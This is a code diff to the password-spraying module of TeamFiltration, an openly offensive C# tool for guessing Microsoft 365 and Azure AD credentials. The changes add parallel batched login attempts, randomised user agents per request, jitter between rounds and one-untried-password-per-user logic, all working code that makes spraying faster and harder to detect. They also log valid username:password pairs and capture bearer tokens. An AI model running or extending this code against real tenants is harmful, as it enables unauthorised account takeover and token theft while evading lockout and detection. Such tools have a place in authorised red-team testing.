@@ -14,6 +14,7 @@ using System.Threading.Tasks;
 using TeamFiltration.Handlers;
 using TeamFiltration.Helpers;
 using TeamFiltration.Models.TeamFiltration;
+using System.Text;
 using System.Text.RegularExpressions;
 using TeamFiltration.Models.MSOL;
 using TimeZoneConverter;
@@ -22,8 +23,6 @@ namespace TeamFiltration.Modules
 {
 	class Spray
 	{
-
-
 
 		public static async Task<SprayAttempt> SprayAttemptWrap(SprayAttempt sprayAttempt, GlobalArgumentsHandler teamFiltrationConfig, DatabaseHandler _databaseHandler, UserRealmResp userRealmResp)
 		{
@@ -102,93 +101,120 @@ namespace TeamFiltration.Modules
 			DatabaseHandler _databaseHandler,
 			UserRealmResp userRealmResp,
 			int delayInSeconds = 0,
-			int regionCounter = 0)
+			int regionCounter = 0,
+			int parallelCount = 0)
 		{
 
 			var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY", _databaseHandler);
 
 			var validSprayAttempts = new List<SprayAttempt>() { };
-			await sprayAttempts.ParallelForEachAsync(
-				  async sprayAttempt =>
-				  {
-					  try
-					  {
 
+			// Helper method to process a single spray attempt
+			async Task ProcessSprayAttempt(SprayAttempt sprayAttempt)
+			{
+				try
+				{
+					(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);
 
-						  (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);
+					if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
+					{
+						if (!userRealmResp.Adfs)
+							_databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID!", sprayAttempt.FireProxRegion));
+						else
+							_databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID NO MFA!", sprayAttempt.FireProxRegion));
+						sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
+						sprayAttempt.Valid = true;
 
-						  if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
-						  {
-							  if (!userRealmResp.Adfs)
-								  _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID!", sprayAttempt.FireProxRegion));
-							  else
-								  _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID NO MFA!", sprayAttempt.FireProxRegion));
-							  sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
-							  sprayAttempt.Valid = true;
+					}
+					else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description) && userRealmResp.Adfs)
+					{
+						if (loginResp.bearerTokenError.error_description.Contains("User does not exsists?"))
+							sprayAttempt.Disqualified = true;
 
-						  }
-						  else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description) && userRealmResp.Adfs)
-						  {
-							  if (loginResp.bearerTokenError.error_description.Contains("User does not exsists?"))
-								  sprayAttempt.Disqualified = true;
+						_databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {loginResp.bearerTokenError?.error_description}", sprayAttempt.FireProxRegion), true, true);
 
-							  _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {loginResp.bearerTokenError?.error_description}", sprayAttempt.FireProxRegion), true, true);
+						sprayAttempt.ResponseCode = loginResp.bearerTokenError?.error_description;
+						sprayAttempt.Valid = false;
+						sprayAttempt.ConditionalAccess = false;
+					}
+					else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
+					{
+						var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
+						var message = loginResp.bearerTokenError.error_description.Split(":")[1].Trim();
 
-							  sprayAttempt.ResponseCode = loginResp.bearerTokenError?.error_description;
-							  sprayAttempt.Valid = false;
-							  sprayAttempt.ConditionalAccess = false;
-						  }
-						  else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
-						  {
-							  var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
-							  var message = loginResp.bearerTokenError.error_description.Split(":")[1].Trim();
+						//Set a default response
+						var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);
 
-							  //Set a default response
-							  var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);
+						//Try to parse
+						Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);
 
-							  //Try to parse
-							  Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);
+						//Write result
+						var printLogBool = (errorCodeOut.accessPolicy || errorCodeOut.valid || errorCodeOut.disqualified);
 
-							  //Write result
-							  var printLogBool = (errorCodeOut.accessPolicy || errorCodeOut.valid || errorCodeOut.disqualified);
+						if (!string.IsNullOrEmpty(errorCodeOut.msg))
+							_databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {errorCodeOut.msg}", sprayAttempt.FireProxRegion), true, true);
+						else
+							_databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {respCode.Trim()}", sprayAttempt.FireProxRegion), true, true);
 
-							  if (!string.IsNullOrEmpty(errorCodeOut.msg))
-								  _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {errorCodeOut.msg}", sprayAttempt.FireProxRegion), true, true);
-							  else
-								  _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {respCode.Trim()}", sprayAttempt.FireProxRegion), true, true);
+						//If we get a valid response, parse and set the token data as json
+						if (errorCodeOut.valid)
+							sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
 
-							  //If we get a valid response, parse and set the token data as json
-							  if (errorCodeOut.valid)
-								  sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
+						sprayAttempt.ResponseCode = respCode;
+						sprayAttempt.Valid = errorCodeOut.valid;
+						sprayAttempt.Disqualified = errorCodeOut.disqualified;
+						sprayAttempt.ConditionalAccess = errorCodeOut.accessPolicy;
 
-							  sprayAttempt.ResponseCode = respCode;
-							  sprayAttempt.Valid = errorCodeOut.valid;
-							  sprayAttempt.Disqualified = errorCodeOut.disqualified;
-							  sprayAttempt.ConditionalAccess = errorCodeOut.accessPolicy;
+					}
+					else
+					{
+						_databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => UNKNOWN or malformed response!", sprayAttempt.FireProxRegion));
 
-						  }
-						  else
-						  {
-							  _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => UNKNOWN or malformed response!", sprayAttempt.FireProxRegion));
+					}
 
-						  }
+					if (sprayAttempt.Valid)
+						validSprayAttempts.Add(sprayAttempt);
 
-						  if (sprayAttempt.Valid)
-							  validSprayAttempts.Add(sprayAttempt);
+					_databaseHandler.WriteSprayAttempt(sprayAttempt, teamFiltrationConfig);
+				}
+				catch (Exception ex)
+				{
+					_databaseHandler.WriteLog(new Log("SPRAY", $"SOFT ERROR when spraying  {sprayAttempt.Username}:{sprayAttempt.Password} => {ex.Message}", sprayAttempt.FireProxRegion));
 
-						  _databaseHandler.WriteSprayAttempt(sprayAttempt, teamFiltrationConfig);
-						  Thread.Sleep(delayInSeconds * 1000);
-					  }
-					  catch (Exception ex)
-					  {
-						  _databaseHandler.WriteLog(new Log("SPRAY", $"SOFT ERROR when spraying  {sprayAttempt.Username}:{sprayAttempt.Password} => {ex.Message}", sprayAttempt.FireProxRegion));
+				}
+				_databaseHandler._globalDatabase.Checkpoint();
+			}
 
-					  }
-					  _databaseHandler._globalDatabase.Checkpoint();
-				  },
-							maxDegreeOfParallelism: 20);
-
-
+			// Sequential execution (no --parallel flag)
+			if (parallelCount == 0)
+			{
+				for (int i = 0; i < sprayAttempts.Count; i++)
+				{
+					// Apply jitter before each request (except the first one) in sequential mode
+					if (delayInSeconds > 0 && i > 0)
+						Thread.Sleep(delayInSeconds * 1000);
+					
+					await ProcessSprayAttempt(sprayAttempts[i]);
+				}
+			}
+			// Parallel execution (--parallel flag specified)
+			else
+			{
+				// Process in batches of parallelCount
+				for (int i = 0; i < sprayAttempts.Count; i += parallelCount)
+				{
+					var batch = sprayAttempts.Skip(i).Take(parallelCount).ToList();
+					
+					// Process batch in parallel
+					await batch.ParallelForEachAsync(
+						async sprayAttempt => await ProcessSprayAttempt(sprayAttempt),
+						maxDegreeOfParallelism: parallelCount);
+					
+					// Apply jitter between batches (rounds) in parallel mode
+					if (delayInSeconds > 0 && i + parallelCount < sprayAttempts.Count)
+						Thread.Sleep(delayInSeconds * 1000);
+				}
+			}
 
 			return validSprayAttempts;
 		}
@@ -214,6 +240,7 @@ namespace TeamFiltration.Modules
 			var shuffleUsersBool = args.Contains("--shuffle-users");
 			bool shufflePasswordsBool = args.Contains("--shuffle-passwords");
 			bool shuffleFireProxBool = args.Contains("--shuffle-regions");
+			bool shuffleUserAgentsBool = args.Contains("--shuffle-useragents");
 			bool autoExfilBool = args.Contains("--auto-exfil");
 
 			List<string> passwordList = new List<string>() { };
@@ -223,6 +250,19 @@ namespace TeamFiltration.Modules
 			var databaseHandle = new DatabaseHandler(args);
 
 			var _globalProperties = new Handlers.GlobalArgumentsHandler(args, databaseHandle);
+
+			// Parse --parallel option
+			int parallelCount = 0;
+			if (args.Contains("--parallel"))
+			{
+				parallelCount = Convert.ToInt32(args.GetValue("--parallel"));
+				if (parallelCount < 1)
+				{
+					databaseHandle.WriteLog(new Log("SPRAY", "ERROR: --parallel must be >= 1"));
+					Console.WriteLine("[!] ERROR: --parallel must be >= 1");
+					Environment.Exit(1);
+				}
+			}
 
 			DateTime StarTimeParsed = new DateTime();
 			DateTime StopTimeParsed = new DateTime();
@@ -275,7 +315,72 @@ namespace TeamFiltration.Modules
 				delayInSeconds = 0;
 			}
 
+			// Parse user agents from config if --shuffle-useragents is enabled
+			List<string> userAgentList = new List<string>();
+			if (shuffleUserAgentsBool)
+			{
+				var userAgentConfig = _globalProperties.TeamFiltrationConfig?.UserAgent ?? "";
+				if (!string.IsNullOrEmpty(userAgentConfig))
+				{
+					// Split by % delimiter
+					userAgentList = userAgentConfig.Split('%')
+						.Select(ua => ua.Trim())
+						.Where(ua => !string.IsNullOrEmpty(ua))
+						.ToList();
+				}
+
+				if (userAgentList.Count == 0)
+				{
+					// Fallback to default if config is empty
+					userAgentList.Add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.3.00.30866 Chrome/80.0.3987.165 Electron/8.5.1 Safari/537.36");
+					databaseHandle.WriteLog(new Log("SPRAY", "WARNING: No user agents found in config, using default"));
+					Console.WriteLine("[!] WARNING: No user agents found in config, using default");
+				}
+				else if (userAgentList.Count == 1)
+				{
+					databaseHandle.WriteLog(new Log("SPRAY", $"Only one user agent found in config file, will use: {userAgentList[0]}"));
+					Console.WriteLine($"[+] Only one user agent found in config file, will use: {userAgentList[0]}");
+				}
+				else
+				{
+					databaseHandle.WriteLog(new Log("SPRAY", $"Found {userAgentList.Count} user agents in config, will randomize per request"));
+					Console.WriteLine($"[+] Found {userAgentList.Count} user agents in config, will randomize per request");
+				}
+			}
+
 			databaseHandle.WriteLog(new Log("SPRAY", $"Sleeping between {sleepInMinutesMin}-{sleepInMinutesMax} minutes for each round"!));
+
+			// Print configuration announcements in green
+			Console.ForegroundColor = ConsoleColor.Green;
+			if (shuffleUsersBool)
+			{
+				Console.WriteLine($"[+] --shuffle-users used, usernames will be randomized");
+				databaseHandle.WriteLog(new Log("SPRAY", "--shuffle-users used, usernames will be randomized"));
+			}
+			if (shufflePasswordsBool)
+			{
+				Console.WriteLine($"[+] --shuffle-passwords used, passwords will be randomized per user");
+				databaseHandle.WriteLog(new Log("SPRAY", "--shuffle-passwords used, passwords will be randomized per user"));
+			}
+			if (delayInSeconds > 0)
+			{
+				if (parallelCount == 0)
+				{
+					Console.WriteLine($"[+] --jitter {delayInSeconds} used, waiting {delayInSeconds} seconds per request");
+					databaseHandle.WriteLog(new Log("SPRAY", $"--jitter {delayInSeconds} used, waiting {delayInSeconds} seconds per request"));
+				}
+				else
+				{
+					Console.WriteLine($"[+] --jitter {delayInSeconds} used, waiting {delayInSeconds} seconds per {parallelCount} parallel requests");
+					databaseHandle.WriteLog(new Log("SPRAY", $"--jitter {delayInSeconds} used, waiting {delayInSeconds} seconds per {parallelCount} parallel requests"));
+				}
+			}
+			if (parallelCount > 0)
+			{
+				Console.WriteLine($"[+] --parallel {parallelCount} used, running {parallelCount} requests in parallel");
+				databaseHandle.WriteLog(new Log("SPRAY", $"--parallel {parallelCount} used, running {parallelCount} requests in parallel"));
+			}
+			Console.ResetColor();
 
 			if (!string.IsNullOrEmpty(exludeListPath))
 			{
@@ -422,7 +527,11 @@ namespace TeamFiltration.Modules
 			}
 			var regionCounter = endpointCount > 1 ? rnd.Next(0, endpointCount) : 0;
 
+			// Track round number (persists across loop iterations)
+			int roundNumber = 0;
+
 		sprayCalc:
+			roundNumber++;
 
 			if (args.Contains("--time-window"))
 			{
@@ -474,10 +583,7 @@ namespace TeamFiltration.Modules
 
 				//time left to sleep based on this
 				int timeLeftToSleep = currentSleepTime - minutesSinceFirstAccountSprayed;
-				TimeZoneInfo easternZone = TZConvert.GetTimeZoneInfo("Eastern Standard Time");
-
-
-				databaseHandle.WriteLog(new Log("SPRAY", $"{minutesSinceFirstAccountSprayed}m since last spray, spraying will resume {TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow.AddMinutes(timeLeftToSleep), easternZone)} EST"));
+				databaseHandle.WriteLog(new Log("SPRAY", $"{minutesSinceFirstAccountSprayed}m since last spray, spraying will resume {DateTime.UtcNow.AddMinutes(timeLeftToSleep):dd/MM/yyyy HH:mm:ss} UTC"));
 				Thread.Sleep((int)TimeSpan.FromMinutes(timeLeftToSleep).TotalMilliseconds);
 				goto sprayCalc;
 			}
@@ -544,38 +650,56 @@ namespace TeamFiltration.Modules
 			await bufferuserNameList.ParallelForEachAsync(
 			   async userName =>
 			   {
+				   // Get passwords already tried for this user
+				   var triedPasswords = allCombos
+					   .Where(c => c.StartsWith(userName.ToLower() + ":"))
+					   .Select(c => c.Split(':')[1])
+					   .ToList();
 
+				   // Filter password list to only untried passwords
+				   var untriedPasswords = passwordList
+					   .Where(p => !triedPasswords.Contains(p))
+					   .ToList();
+
+				   if (untriedPasswords.Count == 0)
+					   return; // All passwords for this user have been tried
+
+				   // Shuffle passwords if --shuffle-passwords is enabled
 				   if (shufflePasswordsBool)
-					   passwordList = passwordList.Randomize().ToList();
+					   untriedPasswords = untriedPasswords.Randomize().ToList();
+				   else
+					   untriedPasswords = untriedPasswords.ToList(); // Keep original order
 
-				   foreach (var password in passwordList)
+				   // Select first untried password (or first from randomized list)
+				   var selectedPassword = untriedPasswords.First();
+
+				   var fireProxObject = fireProxList.First();
+
+				   if (shuffleFireProxBool)
+					   fireProxObject = fireProxList.Randomize().First();
+
+				   // Select user agent if --shuffle-useragents is enabled
+				   string selectedUserAgent = null;
+				   if (shuffleUserAgentsBool && userAgentList.Count > 0)
 				   {
-					   var fireProxObject = fireProxList.First();
-
-					   if (shuffleFireProxBool)
-						   fireProxObject = fireProxList.Randomize().First();
-
-					   //If this combo does NOT exsits, add it
-					   if (!allCombos.Contains(userName.ToLower() + ":" + password))
-					   {
-						   var randomResource = Helpers.Generic.RandomO365Res();
-
-						   listOfSprayAttempts.Add(new SprayAttempt()
-						   {
-
-							   Username = userName,
-							   Password = password,
-							   //ComboHash = "",
-							   FireProxURL = fireProxObject.fireProxUrl,
-							   FireProxRegion = "DIRECT",
-							   ResourceClientId = randomResource.clientId,
-							   ResourceUri = randomResource.Uri,
-							   AADSSO = _globalProperties.AADSSO,
-							   ADFS = getUserRealmResult.Adfs
-						   });
-						   break;
-					   }
+					   selectedUserAgent = userAgentList.Randomize().First();
 				   }
+
+				   var randomResource = Helpers.Generic.RandomO365Res();
+
+				   listOfSprayAttempts.Add(new SprayAttempt()
+				   {
+					   Username = userName,
+					   Password = selectedPassword,
+					   //ComboHash = "",
+					   FireProxURL = fireProxObject.fireProxUrl,
+					   FireProxRegion = "DIRECT",
+					   ResourceClientId = randomResource.clientId,
+					   ResourceUri = randomResource.Uri,
+					   AADSSO = _globalProperties.AADSSO,
+					   ADFS = getUserRealmResult.Adfs,
+					   UserAgent = selectedUserAgent
+				   });
 			   },
 				 maxDegreeOfParallelism: 500);
 
@@ -602,8 +726,37 @@ namespace TeamFiltration.Modules
 				}
 			}
 
+			// Calculate estimated time for this round
+			double estimatedSeconds = 0;
+			if (parallelCount == 0)
+			{
+				// Sequential: (number of attempts - 1) * jitter
+				estimatedSeconds = (listOfSprayAttempts.Count - 1) * delayInSeconds;
+			}
+			else
+			{
+				// Parallel: (number of batches - 1) * jitter
+				int batches = (int)Math.Ceiling((double)listOfSprayAttempts.Count / parallelCount);
+				estimatedSeconds = (batches - 1) * delayInSeconds;
+			}
 
-			var validAccounts = await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds, regionCounter);
+			// Calculate total unique passwords that need to be tried
+			// This is the maximum number of rounds needed (one password per user per round)
+			int totalUniquePasswords = passwordList.Count;
+			int usersInThisRound = listOfSprayAttempts.Select(x => x.Username).Distinct().Count();
+
+			// Display round information
+			TimeSpan estimatedTime = TimeSpan.FromSeconds(estimatedSeconds);
+			string timeEstimate = estimatedSeconds > 0 
+				? $"Estimated time: {estimatedTime.TotalMinutes:F1} minutes ({estimatedTime.TotalSeconds:F0} seconds)"
+				: "Estimated time: < 1 second";
+
+			Console.ForegroundColor = ConsoleColor.Green;
+			Console.WriteLine($"[+] Round {roundNumber} of {totalUniquePasswords} passwords - Spraying {usersInThisRound} users ({listOfSprayAttempts.Count} attempts per round) - {timeEstimate}");
+			Console.ResetColor();
+			databaseHandle.WriteLog(new Log("SPRAY", $"Round {roundNumber} of {totalUniquePasswords} passwords - Spraying {usersInThisRound} users ({listOfSprayAttempts.Count} attempts per round) - {timeEstimate}"));
+
+			var validAccounts = await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds, regionCounter, parallelCount);
 
 			foreach (var fireProxObject in fireProxList)
 			{
